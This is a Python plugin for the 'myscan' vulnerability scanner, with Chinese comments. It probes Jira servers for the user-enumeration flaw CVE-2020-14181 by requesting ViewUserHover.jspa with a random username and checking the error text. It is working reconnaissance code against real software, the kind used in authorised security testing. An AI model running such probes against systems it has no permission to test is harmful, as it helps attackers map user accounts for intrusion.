# !/usr/bin/env python3
# @Time    : 2020/10/21
# @Author  : caicai
# @File    : poc_jira_userenum_cve-2020-14181_2020.py


from myscan.lib.parse.response_parser import response_parser
from myscan.lib.parse.dictdata_parser import dictdata_parser
from myscan.config import scan_set
from myscan.lib.helper.request import request  # 修改了requests.request请求的库，建议使用此库，会在redis计数
from myscan.lib.core.common import get_random_str
from myscan.lib.core.base import PocBase


class POC(PocBase):
    def __init__(self, workdata):
        self.dictdata = workdata.get("dictdata")  # python的dict数据，详情请看docs/开发指南Example dict数据示例
        self.url = workdata.get("data")  # self.url为需要测试的url，值为目录url，会以/结尾,如https://www.baidu.com/home/ ,为目录
        self.result = []  # 此result保存dict数据，dict需包含name,url,level,detail字段，detail字段值必须为dict。如下self.result.append代码
        self.name = "jira_userenum_cve-2020-14181"
        self.vulmsg = "referer: https://jira.atlassian.com/browse/JRASERVER-71560 "
        self.level = 1  # 0:Low  1:Medium 2:High

    def verify(self):
        # 根据config.py 配置的深度，限定一下目录深度
        if self.url.count("/") > int(scan_set.get("max_dir", 2)) + 2:
            return
        parse = dictdata_parser(self.dictdata)
        if not self.can_output(parse.getrootpath() + self.name):  # 限定只输出一次
            return
        not_existuser = get_random_str(6).lower()
        req = {
            "method": "GET",
            "url": self.url + "secure/ViewUserHover.jspa?username={}".format(not_existuser),
            "allow_redirects": False,
            "verify": False,
            "timeout": 10
        }
        r = request(**req)
        if r is not None and r.status_code == 200 and "User does not exist: {}".format(
                not_existuser).encode() in r.content and b"Atlassian JIRA" in r.content:
            self.can_output(parse.getrootpath() + self.name, True)
            parser_ = response_parser(r)
            self.result.append({
                "name": self.name,
                "url": self.url,
                "level": self.level,  # 0:Low  1:Medium 2:High
                "detail": {
                    "vulmsg": self.vulmsg,
                    "request": parser_.getrequestraw(),
                    "response": parser_.getresponseraw()
                }
            })
